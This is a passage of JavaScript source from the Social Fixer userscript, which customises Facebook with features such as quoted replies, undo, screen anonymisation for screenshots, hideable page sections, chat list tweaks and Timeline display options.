								var restore_textarea = function() { if(!add_comment){return;} removeClass(add_comment,"bfb_floating_comment"); add_comment.style.left = add_comment.style.top = ""; add_comment=null; }
								var last_reply_text = null;
								var selected_text = null;
								var restore_ta = true;
								var comment = null, add_comment = null;
								bind(document,'keydown',function(e) { if(e.keyCode==27) { removeClass(comment,"bfb_reply_active_comment"); restore_textarea(); } })
								var do_reply = function(e) {
									var a = target(e), text;
									var new_comment = parent(a,'.uiUfiComment,.UFIComment');
									var replying_to_same_comment = (new_comment==comment);
									comment = new_comment;
									var post = parent(a,'.uiUnifiedStory,.mall_post,#photocomment');
									if (!post) { 
										post = parent(a,'form.commentable_item');
										if (!post) { 
											log("[Reply]","Couldn't find comment form!");
											return; 
										}
									}
									QS(post,'.uiUfiAddComment, .UFIAddComment',function(ac) {
										log("[Reply]","Found comment container",ac);
										add_comment = ac;
										if (float_textarea) {
											var anchor_position = offset(a);
											var textarea_position = offset(ac);
											var offsetparent_position = offset(ac.offsetParent);
											var post_position = offset(post);

											var left = (anchor_position.left - post_position.left) - (offsetparent_position.left - post_position.left);
											var top = (anchor_position.top - post_position.top) - (offsetparent_position.top - post_position.top);
											left = left - 50;
											top = top + 30;
											
											addClass(ac,"bfb_floating_comment");
											ac.style.left = left+"px";
											ac.style.top = top+"px";
										}
										var actor = QS(comment,'.actorName,.UFICommentActorName');
										if (!actor) { 
											log("[Reply]","Couldn't find actor");
											return; 
										}
										var actor_name = actor.innerHTML;
										var actor_id = null;
										if (tag) {
											try {
												actor_id = match(actor.getAttribute('data-hovercard'),/id=(\d+)/);
											} catch(e) { }
										}
										if (first_name_only) {
											actor_name = actor_name.replace(/\s.*/,'');
										}
										if (actor_id) {
											actor_name = '@['+actor_id+':'+actor_name+']';
										}
										else {
											actor_name = '@'+actor_name;
										}
										text = replying_to_same_comment ? '' : actor_name;
										var quoted = false;
										if (selected_text && selected_text.replace) {
											// "Quote" text
											quoted = true;
											selected_text = selected_text.replace(/([^\n]{45,45}.*?\s)/gm,"$1\n");
											selected_text = selected_text.replace(/^/gm,"> ");
											if (trim(selected_text).length>0) {
												text += (!replying_to_same_comment?' wrote: ':'')+(replying_to_same_comment?"":"\n")+selected_text+"\n\n";
											}
										}
										else {
											text+=': ';
										}
										QS(ac,'textarea',function(ta) { 
											addClass(comment,"bfb_reply_active_comment bfb_reply_commented");
											ta.focus();
											var wait_for_focus = function() {
												if (hasClass(ta,'DOMControl_placeholder')) {
													setTimeout( wait_for_focus,100 );
													return;
												}
												if (!last_reply_text || text!=last_reply_text) {
													var prefix = "";
													if (ta.value=="") { 
														//if (quoted) { prefix = " \n"; }
													}
													else { prefix = "\n\n"; }
//													ta.value = ta.value+prefix+text;
												}
												last_reply_text = text;
												setTimeout(function() {
													try {
														unsafeWindow.Bootloader.loadComponents(["control-textarea"], function() { 
															unsafeWindow.TextAreaControl.getInstance(ta) ;
															ta.value = ta.value+prefix+text;
															ta.focus();
															setCaretToPos(ta,ta.value.length);
															press_key(ta,' ','keydown');
														}.bind(ta)); 
													} catch(e) {
														if (ta.offsetHeight && ta.offsetHeight<20) {
															ta.style.height="80px";
														}
													}
												},100);
											}
											wait_for_focus();
											var comment_box = parent(ta,'.commentBox,.textBoxContainer');
											if (comment_box && !QS(ac,'.bfb_reply_note_first')) {
												insertAfter( el('div','bfb_reply_note bfb_reply_note_first',null,null,'<input type="checkbox" style="height:10px;width:10px;padding:0;" tabindex="-1" class="comment_reply_first_name_only" '+(first_name_only?'checked':'')+'>Reply with first names only <input type="checkbox" style="height:10px;width:10px;padding:0;" tabindex="-1" class="comment_reply_tag" '+(tag?'checked':'')+'>Tag users when replying <a href="http://SocialFixer.com/faq.php#replytag" tabindex="-1" target="_blank" style="text-decoration:underline;">(What is this?)</a>'), comment_box );
												QS(ac,'.comment_reply_first_name_only',function(a) {
													bind(a,'click',function(){ 
														first_name_only=!first_name_only;
														if (first_name_only) {
															ta.value = ta.value.replace(/(\@\w+)(\s+[^:]+):/g,"$1:");
														}
														options.set('comment_reply_first_name_only',first_name_only);
													}); 
												});
												QS(ac,'.comment_reply_tag',function(a) {
													bind(a,'click',function(){ 
														tag=!tag;
														if (!tag) {
															ta.value = ta.value.replace(/\@\[\d+:([^\]]+)\]/g,"$1");
														}
														options.set('comment_reply_tag',tag);
													}); 
												});
											}
											if (float_textarea) {
												if (comment_box && !QS(ac,'.bfb_reply_note_esc')) {
													insertAfter( el('div','bfb_reply_note bfb_reply_note_esc',null,null,'(Press Esc to return comment box to its original location) <a class="bfb_stop_floating" style="text-decoration:underline;" tabindex="-1" href="#">Disable floating replies</a>'), comment_box );
													QS(ac,'.bfb_stop_floating',function(a) {
														bind(a,'click',function(){ 
															restore_ta=false; 
															if(confirm('Click OK to stop the reply comment boxes from floating up to the comment being replied to. Clicking Reply will move you down to the comment entry box instead.')){ 
																restore_textarea(); 
																options.set('comment_reply_float_textarea',false); 
															}
															restore_ta = true;
														}); 
													});
												}
												// When submitted, re-dock the reply
												//bind(QS(ac,'.enter_submit_target'),'click', function() { restore_textarea(); } );
											}
										});
									});
								}
								onSelectorLoad('.commentActions,.UFICommentActions',function(ca) { 
									if (!QS(ca,'.bfb_reply_link')) {
										ca.addEventListener('mousedown',function(){ try{ selected_text=window.getSelection(); if (selected_text && selected_text.getRangeAt) { selected_text = selected_text.getRangeAt(0); if(selected_text) { selected_text = selected_text.toString(); } } }catch(e){} },true);
										var reply = el('a','bfb_reply_link',null,{click:do_reply},'Reply');
										append(ca,reply);
									}
								},"both");
							})();
						}
						
						// ========================================================
						// Undo
						// ========================================================
						var undo_posts = [];
						function undo() {
							if (undo_posts.length==0) {
								alert("Nothing to undo!");
								return;
							}
							for (var i=0; i<undo_posts.length; i++) {
								var post = undo_posts[i];
								var fbid = post.fbid;
								var o = post.post;

								options.set('story_data.'+fbid,parse(post.post_data),false);
								removeClass(o,"bfb_read");
								removeClass(o,"bfb_new_comments");
								
								if (post.type=="mute") {
									removeClass(o,"bfb_muted");
								}
								addClass(o,"bfb_undid");
								update_tab_count(o);
								(function(o2){
									setTimeout( function() { removeClass(o2,"bfb_undid"); }, 3000 );
								})(o);
							}
							undo_posts = [];
							options.save();
						}
						if (options.get('undo_ctrl_z')) {
							bind(document,'keydown',function(e) {
								var t = target(e);
								if (t.tagName && (t.tagName=="TEXTAREA" || t.tagName=="INPUT")) { return; }
								if (e.ctrlKey && e.keyCode==90) { undo(); }
							});
						}
						
						// ========================================================
						// Anonymize Screens
						// ========================================================
						if (!$('bfb_anonymize_screen')) {
							var a = el('a',null,{href:'#',title:'Change the screen to anonymize all users (for screenshots, etc)',id:'bfb_anonymize_screen'},{
								click:function() { 
									var namehash = {};
									var namecount = 1;
									var grouphash = {};
									var groupcount = 1;
									var eventhash = {};
									var eventcount = 1;
									QSA(document,'.uiProfilePhoto,.profilePic,img.bfb_friend_activity_img,.UIImageBlock_MED_Image img,#navAccountPic img,a.UIImageBlock_ENT_Image img,.smallPic .img,.fbChatOrderedList .pic,img[src*=fbcdn-profile-]',function(i) {
										if (i.parentNode && i.parentNode.href && i.parentNode.href.indexOf("photo.php")>=0) { return; } // photo, not profile pic
										if (i.src && i.src.indexOf("external.ak.fbcdn")>=0) { return; } // External img
										if (i.parentNode && hasClass(i.parentNode,'UIImageBlock_MED_Image')) {
											i.src="https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v1/yo/r/UlIqmHJn-SK.gif";
										}
										else {
											i.src=protocol+"//"+host+"/images/wizard/nuxwizard_profile_picture.gif";
										}
									});
									QSA(document,'.actorName a,a.actorName,a.ego_title,span.blueName,a.passiveName,.fbxWelcomeBoxName,*[data-hovercard*="user"],a[href*="/profile.php"],#navAccountName,.headerTinymanName,.UFICommentActorName,.UFILikeSentence a[href^="http"]',function(o) {
										if (QS(o,'img')){return;}
										var c = o.innerHTML;
										if (!namehash[c]) { namehash[c] = "FBUser #"+(namecount++); }
										html(o,'');
										append(o,document.createTextNode(namehash[c]));
									});
									// Loop through stored friends list to see if there are any links left on the page
									var friends = options.get('friend_tracker');
									if (friends) {
										var names = {};
										friends = friends.friends;
										if (friends) {
											for (var id in friends) { names[friends[id].name] = true; }
											QSA(document,'*',function(a) {
												if (names[a.innerHTML]) {
													var c = trim(a.innerHTML);
													if (!namehash[c]) { namehash[c] = "FBUser #"+(namecount++); }
													html(a,'');
													append(a,document.createTextNode(namehash[c]));
												}
											});
										}
									}
									QSA(document,'#groupSideNav .linkWrap, #bfb_nav_content_my_groups span:last-child',function(o) {
										var c = o.innerHTML;
										if (!grouphash[c]) { grouphash[c] = "Group #"+(groupcount++); }
										html(o,'');
										append(o,document.createTextNode(grouphash[c]));
									});
									QSA(document,'#bfb_nav_content_my_events span:last-child',function(o) {
										var c = o.innerHTML;
										if (!eventhash[c]) { eventhash[c] = "Event #"+(eventcount++); }
										html(o,'');
										append(o,document.createTextNode(eventhash[c]));
									});
									// Try to anonymize names in the ticker that are not friends
									QSA(document,'.tickerFeedMessage .token',function(token) {
										try {
											if (token.nextSibling.nodeType==3 && /'s/.test(token.nextSibling.textContent)) {
												token.textContent = "another user";
											}
										}
										catch (e) { }
									});
									hide_bfb_menu();
									return false; 
								}
							},'Anonymize Screen');
							var li = el('li');
							append(li,a);
							add_option_item(li,null,null,'middle');
						}
						
						// ========================================================
						// Make elements Hideable
						// ========================================================
						bind(window,'click',function() {
							QSA(document,'.bfb_show_menu',function(o) { removeClass(o,'bfb_show_menu'); });
						});
						function make_hideable(selector,friendly_name,pref,inverse,frame_element,top,left,if_contains) {
							onSelectorLoad(selector,function(o) {
								if (!if_contains || QS(o,if_contains)) {
									add_hideable(o,friendly_name,pref,inverse,frame_element,top,left);
								}
							});
						}
						function add_hideable(o,friendly_name,pref,inverse,frame_element,top,left) {
							if (pref && ((!inverse && options.get(pref)) || (inverse && !options.get(pref)) )) { hide(o); return; }
							if (typeof hidden_elements[friendly_name]!="undefined") { hide(o); addClass(o,"sfx_hidden"); return; }
							if (typeof hidden_elements_x[friendly_name]!="undefined") { return; }
							addClass(o,'bfb_hideable');
							bind(o,'mouseover',function() { 
								var position = current_style(o,'position');
								if (position!="relative" && position!="absolute" && position!="fixed") {
									o.style.position="relative";
									if (o.style.setProperty) {
										o.style.setProprty('position','relative','important');
									}
								}
							});
							bind(o,'mouseout',function() {
								o.style.position='';
							});
							var hide_x = el('div','bfb_hide_el',null,

							{'click':function(e){
								e.stopPropagation();
								e.preventDefault();
								var item = target(e);
								if (hasClass(item,'bfb_hide_section')) {
									removeClass(hide_x,'bfb_show_menu');
									if (confirm('Are you sure you want to hide "'+friendly_name+'"?\nTo show it again, go into Options->Hidden Items and enable it')) {
										if (pref) {
											options.set(pref,!inverse);
										}
										else {
											if (hidden_elements_string.length>0){ hidden_elements_string+= ","; }
											hidden_elements_string += friendly_name;
											options.set('hidden_elements',hidden_elements_string);
										}
										remove_frame(o);
										hide(o);
									}
								}
								else if (hasClass(item,'bfb_hide_x')) {
									removeClass(hide_x,'bfb_show_menu');
									if (hidden_elements_x_string.length>0){ hidden_elements_x_string+= ","; }
									hidden_elements_x_string += friendly_name;
									options.set('hidden_elements_x',hidden_elements_x_string);
									remove_frame(o);
									removeChild(hide_x);
								}
								else {
									toggleClass(hide_x,'bfb_show_menu');
								}
							},'mouseover':function(e) {
								add_frame((frame_element || o),top,left);
							},'mouseout':function(e) {
								remove_frame(o);
							}
							},'',{'position':'absolute','top':'0px','right':'0px','border':'1px solid black;','zIndex':999});
							
							var hide_menu = el('div','bfb_hide_menu',null,null,'<div class="bfb_item bfb_hide_section">Hide '+friendly_name+'</div><div class="bfb_item bfb_hide_x">Hide this "x"</div>');
							append(hide_x,hide_menu);
							
							append(o,hide_x);
						}
						function add_frame(o,top,left) {
							if (QS(o,'.bfb_frame')) { return; }
							var d = el('div','bfb_frame');
							d.style.width = (o.offsetWidth-4) + 'px';
							if (left) {
								d.style.left = left;
							}
							else {
								var padding_left = current_style(o,'padding-left');
								if (padding_left) {
									d.style.paddingLeft = "-" + padding_left;
								}
							}
							if (top) {
								d.style.top = top;
							}
							else {
								var padding_top = current_style(o,'padding-top');
								if (padding_top) {
									d.style.paddingTop = "-" + padding_top;
								}
							}
							d.style.height = (o.offsetHeight-4) + 'px';
							insertFirst(o,d);
						}
						function remove_frame(o) {
							removeChild(QS(o,'.bfb_frame'));
						}
						
						// Make some things hideable
						make_hideable('#pageNav a[href*="sk=ff"], #pageNav a[href*="/find-friends"]','Find Friends');
						make_hideable('#pagelet_rhc_footer','Right Column Footer');
						make_hideable('#pagelet_reminders .fbRemindersStory','Create Event',null,null,null,null,null,'a[ajaxify="/ajax/plans/create/dialog.php"]');
						make_hideable('#pagelet_friends_online','Friends on Chat (Left Col)');
						make_hideable('#pagelet_chat_home_facepile','Friends on Chat (Left Col)');
						make_hideable('#pagelet_welcome_box','My name and picture');
						
						// Make some left col sections hideable
						make_hideable('#pagelet_bookmark_nav #adsNav','Ads Section');
						make_hideable('#pagelet_bookmark_nav #pagesNav','Pages Section');
						make_hideable('#pagelet_bookmark_nav #groupsNav','Groups Section');
						make_hideable('#pagelet_bookmark_nav #appsNav','Apps Section');
						make_hideable('#pagelet_bookmark_nav #developerNav','Developer Section');
						make_hideable('#pagelet_bookmark_nav #listsNav','Lists Section');
						make_hideable('#pagelet_bookmark_nav #interestsNav','Interests Section');
						
						make_hideable('#pagelet_bookmark_nav #navItem_app_140472815972081','Pages Feed');
						make_hideable('#pagelet_bookmark_nav #navItem_app_357937250942127','Like Pages');
						make_hideable('#pagelet_bookmark_nav #navItem_app_261369767293002','Games Feed');
						make_hideable('#groupsNav #navItem_app_230259100322928','Create Group');
						
						make_hideable('li#navItem_app_2344061033','Events (Left Column)');
						make_hideable('li#navItem_app_2356318349','Find Friends (Left Column)');
						make_hideable('li#navItem_app_183217215062060','Pokes (Left Column)');
						
						// Ads in photo popup
						make_hideable('#fbPhotoSnowlift .ego_column','Ads in Photo Popup');

						// ========================================================
						// Link redirection
						// ========================================================
						var prevent_redirect = options.get('prevent_link_redirection');
						var fix_social_news_links = options.get('fix_social_news_links');
						window.addEventListener('mousedown',function(e){
							var a = parent(target(e),'a');
							if (a && a.tagName && a.tagName=="A") {
								var h = a.href;
								if (h && h.indexOf('/dialog/oauth?')) {
									return;
								}
								// Handle theguardian 
								if (a.removeAttribute && (prevent_redirect || (fix_social_news_links && a.href && /guardian\.co\.uk/.test(a.href)))) {
									a.removeAttribute('onmousedown');
								}
								if (fix_social_news_links && a.href && /redirect_uri/.test(a.href)) {
									var url = match(a.href,/redirect_uri=(.*?)\%3F/);
									if (url) {
										a.removeAttribute('rel');
										a.href=unescape(url);
										a.target="_blank";
									}
								}
							}
						},true);

						// ========================================================
						// Tickers
						// ========================================================
					//	make_hideable('#pagelet_rhc_ticker .fbFeedTicker','Live Activity Ticker','hide_happening_now');
						make_hideable('#rightCol .fixedAux .canvasSidebar','Game Icon Sidebar','hide_game_sidebar');
						make_hideable('#rightCol .fixedAux .canvasTicker','Game Ticker','hide_game_ticker');
						
						// ========================================================
						// Chat
						// ========================================================
						// Disable Sidebar
						if (unsafeWindow && unsafeWindow.requireLazy) {
							unsafeWindow.requireLazy(["ShortProfiles","AvailableList","ChatVisibility"],function(ShortProfiles,AvailableList,ChatVisibility) {
								if (options.get('chat_disable_sidebar')) {
									subscribe('sidebar/initialized',function(a,ChatSidebar){
										log("[chat]","sidebar/initialized");
										if (ChatSidebar && ChatSidebar.isViewportCapable && ChatSidebar.disable) {
											log("[chat]","killing the ChatSidebar");
											ChatSidebar.isViewportCapable = function(){return false;};
											ChatSidebar.disable();
										}
									});
								}

								// Force Offline
								if (options.get('chat_force_offline')) {
									poll(function() {
										ChatVisibility.goOffline();
									})
								}

								// Show all online users
								var order_by_online_status = options.get('chat_group_by_status');
								if (options.get('chat_show_all_online')) {
									log("[chat]","Show all online users");
									var compact = options.get('chat_compact');
									var bfb_chat_list = null;
									var previous_status;
									var render_chat_item = function(id) {
										var uinfo = ShortProfiles.getNow(id);
										var status = AvailableList.get(id);
										
										if (status==1) { status = 'idle'; }
										else if (status==3) { status='mobile'; if (options.get('chat_hide_mobile_users')) { return; } }
										else { status='active'; }
										
										if (uinfo) {
											var style = '';
											if (order_by_online_status && previous_status!=null && status!=previous_status) {
												style = "border-top:1px solid #aaa;";
											}
											previous_status=status;
											var displayName = uinfo.name;
											if (displayName.length>16) {
												displayname = displayName.substr(0,16)+"...";
											}
											var h = _template( '\n												<a style="%1%" class="clearfix" href="#" onclick="Chat.openTab(\'%2%\',\'%3%\',\'friend\');return false;" rel="ignore">\n													<div></div>\n													<img width="1" height="1" class="pic img" src="%4%"/>\n													<div class="icons icon_container">\n											    		<img width="1" height="1" alt="" src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/y4/r/-PAXP-deijE.gif" class="_d3c lb_status icon img"/>\n														<div class="active_time icon"></div>\n											    		<img onclick="window.open(\'%6%\');return false;" width="1" height="1" alt="" src="https://s-static.ak.fbcdn.net/rsrc.php/v2/y4/r/-PAXP-deijE.gif" class="timeline_icon icon img" data-hover="tooltip" title="View Timeline" tabindex="0"/>\n											    		<img width="1" height="1" alt="" src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/y4/r/-PAXP-deijE.gif" class="status icon img"/>\n										    		</div>\n													<img width="10" height="8" alt="" src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yW/r/F7kk7-cjEKk.png" class="_42i1 img" />\n													<div class="name">%5%</div>\n												</a>\n											', style, jsescape(id), jsescape(uinfo.name), uinfo.thumbSrc, displayName, uinfo.uri);
											//log("[chat]","Rendering",uinfo,status);
											return el('li','_42fz -cx-PRIVATE-fbChatOrderedList__item item '+status,null,null,h);
										}
										return null;
									};
									var update_chat_list = function(lists) {
										if (!lists) { 
											log("[chat]","Original chat list is null, aborting");
											return; 
										}
										$each(lists,function(list) {
											list.style.display = "none";
											var bfb_chat_list = QS(list.parentNode,'.bfb_chat_ordered_list');
											if (bfb_chat_list) {
												log("[chat]","Chat list already exists in ",list);
											} 
											else {
												bfb_chat_list = el('ul','fbChatOrderedList bfb_chat_ordered_list'+(compact?' compact':''));
												log("[chat]","New chat list created",bfb_chat_list,list);
												append(list.parentNode,bfb_chat_list);
											}
											var ids = AvailableList.getAvailableIDs().sort( function(a,b) {
												try {
													var status_a = AvailableList.get(a);
													var status_b = AvailableList.get(b);
													if (!order_by_online_status || (status_a==status_b)) {
														// Sort by name
														return (ShortProfiles.getNow(a).name < ShortProfiles.getNow(b).name) ? -1: 1;
													}
													// Sort by status
													if (status_a==2 && status_b==2) { return 0; }
													if (status_a==2 && status_b!=2) { return -1; }
													if (status_b==2 && status_a!=2) { return 1; }
													return (status_a > status_b) ? -1 : 1;
												}
												catch(e) { return 1; }
											} );
											html(bfb_chat_list,'');
											previous_status=null;
											var online_count = 0;
											for (var i=0; i<ids.length; i++) {
												var li = render_chat_item(ids[i]);
												if (li) { 
													append(bfb_chat_list,li); 
													online_count++;
												}
											}
											resize_chat(list);
											// Update the count of users online
											var count = online_count;
											var label = QS(document,'#fbDockChatBuddylistNub .fbNubButton .label');
											if (label) {
												var label_count = QS(label,'.count');
												if (!label_count) {
													label_count = el('span','count');
													append(label,label_count);
												}
												if (count>0) {
													html(label_count,' (<strong>'+count+'</strong>)');
												}
												else {
													html(label_count,'');
												}
											}
										});
									};
									var resize_chat = function(bfb_chat_list) {
										if (!bfb_chat_list) { return; }
										var flyout = parent(bfb_chat_list,'.fbNubFlyout');
										var title = QS(flyout,'.fbNubFlyoutTitlebar');
										var body = QS(flyout,'.fbNubFlyoutBody');
										var footer = QS(flyout,'.fbNubFlyoutFooter');
										if (body && flyout && flyout.style && flyout.style.maxHeight && title && footer) {
											body.style.maxHeight = (parseInt(flyout.style.maxHeight) - (title.offsetHeight||0) - (footer.offsetHeight||0)) + 'px';
										}
										if (body) {
											body.style.minHeight="100px";
										}
									}
									bind(window,'resize',function() {
										QSA(document,'.bfb_chat_ordered_list',function(list) {
											resize_chat(list);
										});
									});
									
									subscribe(['buddylist/count-changed','buddylist/updated','buddylist-nub/initialized'], function(e) {
										var lists = QSA(document,'.fbChatOrderedList.clearfix');
										if (!AvailableList || !ShortProfiles) { 
											log("[chat]","AvailableList or ShortProfiles unavailable, aborting");
											return; 
										}
										log("[chat]","Updating chat lists",e);
										update_chat_list(lists);
									});
								}
							});
						}

						// ========================================================
						// Arbiter Logging
						// ========================================================
						// When navigating away from a page, Facebook clears all the function subscriptions
						// in Arbiter. We need to wait for it to refresh, then add then again. Seems crazy.
				/*
						unsafeWindow.Arbiter.sfx_connected = true;
						on_page_change(function() {
							// Keep polling the Arbiter to see if it's ready to be re-connected
							poll(function(c) {
								// If Arbiter doesn't exist, or we're still connected, wait and try again
								if (!unsafeWindow.Arbiter || unsafeWindow.Arbiter.sfx_connected) { 
									return false; 
								}
								alert("re-connecting Arbiter!");
								unsafeWindow.Arbiter.sfx_connected = true;
								resubscribe_all();
							},100,5);
						});
				*/
						if (false) {
							(function() {
								var pause = null;
								unsafeWindow.ArbiterMonitor = {
									record: function(type,i,c,a) {
										if ( unsafeWindow.console && type!='done' && !/^function_ext/.test(i) && !(/^bootload/.test(i)) && !(/^phase/.test(i)) ) {
											var msg = arguments[1];
											for (var i=2; i<arguments.length; i++) {
												if (arguments[i]!=unsafeWindow.Arbiter) {
													msg += ","+arguments[i];
												}
											}
											if (!/MouseEvent|focus|blur|reset/.test(msg) ) {
												log("[arbiter]",msg);
											}
										}
									},
									customReport:function(){},initUE:function(){},getInternRef:function(){},
									pause:function(){}, 
									resume:function(){},
									initUA:function(){},
									getUE:function(){},
									getActFields:function(){}
								};
							})();
						}

						// Auto-switch to Chronological Sort order
						if (options.get('auto_switch_to_recent_stories')) {
							var chrono_switched = options.get('chrono_switched');
							if (chrono_switched) {
								options.set('chrono_switched',false);
								if (options.get('auto_switch_to_recent_stories_show_message')) {
									quickmessage('Social Fixer automatically switched you to "Recent Stories First" view of your news feed. You can click this message if you no longer wish to see it when the sort order is automatically switched. You can disable auto-switching in Options.',10,function() {
											options.set('auto_switch_to_recent_stories_show_message',false);
										},
										{border:'3px solid black'}
									);
								}
							}
							else {
								var switch_to_most_recent = function() {
									options.set('chrono_switched',true,false);
									options.save(function() {
										unsafeWindow.location.href="/?sk=h_chr";
									});
								};
								// New way to figure out if we are not on most recent feed
								poll(function() {
									if (!unsafeWindow.UIIntentionalStream || !unsafeWindow.UIIntentionalStream.instance) { return false; }
									if (unsafeWindow.UIIntentionalStream.instance.currentFilterKey && unsafeWindow.UIIntentionalStream.instance.currentFilterKey!="h_chr") {
										if (QS('.uiStreamHeaderChronologicalForm')) {
											switch_to_most_recent();
										}
									}
								},100,50);
								onSelectorLoad('.uiStreamHeaderChronologicalForm a.itemAnchor[aria-checked="false"][href="/?sk=h_chr"]',function(a) {
									switch_to_most_recent();
								},false);
							}
						}
						
						// Hide the hovercards!
						if (options.get('hide_hovercard')) {
							bind(window,'mouseover',function(e) {
								var t = target(e);
								if (t && t.tagName=="IMG" && t.parentNode.tagName=="A") {
									t = t.parentNode;
								}
								if (t && t.tagName=="A" && t.getAttribute('data-hovercard')!=null) {
									log("[hovercard]","Killing Hovercard");
									t.removeAttribute('data-hovercard');
								}
							},true);
							poll(function() {
								var hc = unsafeWindow.Hovercard;
								if (typeof hc=="undefined" || typeof hc.process=="undefined") { return false; }
								log("[hovercard]","Found Hovercard object",hc.process);
								hc._process = hc.process;
								hc.process = function(a) {
									log("[hovercard]","Hovercard.process()",a,a.getAttribute('data-hovercard'));
									if (a.href && /id=\d+/.test(a.getAttribute('data-hovercard'))) {
										return;
									}
									else {
										hc._process(a);
									}
								};
							},100,50);
						}
						
						// Turn off autocomplete in the search box
						onIdLoad('q',function(input) { input.setAttribute('autocomplete', 'off'); });
						
						// TIMELINE!
						// ---------
						// Insert a Timeline control panel
						if (options.get('timeline_show_panel')) {
							onSelectorLoad('#pagelet_timeline_main_column',function(tl) {
								QS(document,'#globalContainer',function(gc) {
									if (!$('sfx_timeline_mm')) {
										var offset_left = gc.offsetLeft;
											var w = offset_left - 25;
											if (w<100) { w=100; }
											var msg = 'Your view of Timeline pages can be customized in Social Fixer <span id="sfx_timeline_mm_click_here" style="color:blue;text-decoration:underline;cursor:pointer;">options</span> or changed here.<br><a href="http://SocialFixer.com/faq.php#timeline" target="_blank" style="text-decoration:underline;color:blue;">Learn more...</a>';
											msg += '<br><br>'+options.renderOptionByName('timeline_single_column','sfx_timeline_option_single_column')+'Single Column';
											msg += '<br>'+options.renderOptionByName('timeline_white_background','sfx_timeline_option_white_background')+'White Background';
											msg += '<br><br>Hide:<br>'+options.renderOptionByName('timeline_hide_cover_photo','sfx_timeline_option_hide_cover')+'Cover Photo';
											msg += '<br>'+options.renderOptionByName('timeline_hide_friends_box','sfx_timeline_option_hide_friends')+'Friends Box';
											msg += '<br>'+options.renderOptionByName('timeline_hide_maps','sfx_timeline_option_hide_maps')+'Check-in Maps<br><br>';
											msg += '<center id="sfx_timeline_close_center"></center><br>';
											var mm = el('div','sfx_mini_message_no_x',null,null,msg,{position:'fixed',top:'40px',left:'5px',width:w+'px',maxWidth:'125px',backgroundColor:'#F1F3F8',borderColor:'#C4CDE0',zIndex:4999});
											mm.id = 'sfx_timeline_mm';
											append(QS(mm,'#sfx_timeline_close_center'),button('Close',function(){ options.set('timeline_show_panel',false); hide(parent(this,'.sfx_mini_message_no_x')); },'ddd'));
											click(QS(mm,'#sfx_timeline_mm_click_here'),function(e){ better_fb_options('tab_timeline'); }, false);
											var cb_click = function(id,classname,prefname) {
												click(QS(mm,'#'+id),function(e) {
													var h = QS(document,'html');
													if (this.checked) { addClass(h,classname); }
													else { removeClass(h,classname); }
													options.set(prefname,this.checked);
												});
											};
											cb_click('sfx_timeline_option_single_column','timeline_single_column','timeline_single_column');
											cb_click('sfx_timeline_option_white_background','timeline_white_background','timeline_white_background');
											cb_click('sfx_timeline_option_hide_cover','timeline_hide_cover_photo','timeline_hide_cover_photo');
											cb_click('sfx_timeline_option_hide_friends','timeline_hide_friends_box','timeline_hide_friends_box');
											cb_click('sfx_timeline_option_hide_maps','timeline_hide_maps','timeline_hide_maps');
											append(body(),mm);
									}
								});
							});
							// Unload the Timeline control panel when the page changes
							on_page_change(function() {
								removeChild($('sfx_timeline_mm'));
							});
						}

						// New "See More" link needs to be clicked because expanded text is in javascript, not html source
						if (options.get('auto_expand_comments')) {
							onSelectorLoad('.SeeMoreLink',function(seemore) {
//								clickLink(seemore);
							});
						}

					}; // end of document_ready() definition
					
					// Run the document-dependent code when the document is ready...
					onDOMContentLoaded(document_ready);
				}); // End of load() function

			} catch(e) { var i,str = "Social Fixer Fatal Error in main():\n"+e.toString()+"\n";for (i in e) {str += i+"="+e[i]+"\n";}alert(str); } // try/catch in main()

		}); // GLOBAL WRAPPER

		// Delayed loading for SeaMonkey and Opera. Otherwise run right away.
		var wait_for_contentloaded = false;
		
		try {
			if (unsafeWindow && unsafeWindow.navigator && unsafeWindow.navigator.userAgent && SCRIPT_TYPE=="greasemonkey" && runat=="document-start" && /SeaMonkey/i.test(unsafeWindow.navigator.userAgent)) {
				wait_for_contentloaded = true;
			}
		} catch(e) { }
		if (wait_for_contentloaded) {
			try {
				window.addEventListener('DOMContentLoaded',main,false);
			} catch(e) { alert('Social Fixer Fatal Error: Failed while trying to add event listener!'); }
		}
		else {
			try {
				main();
			} catch(e) { alert('Social Fixer Fatal Error: Failed while trying to call main()!'); }
		}
	}
} catch(e) { var i,str = "Social Fixer Fatal Error in wrapper:\n"+e.toString()+"\n";for (i in e) {str += i+"="+e[i]+"\n";}alert(str); }
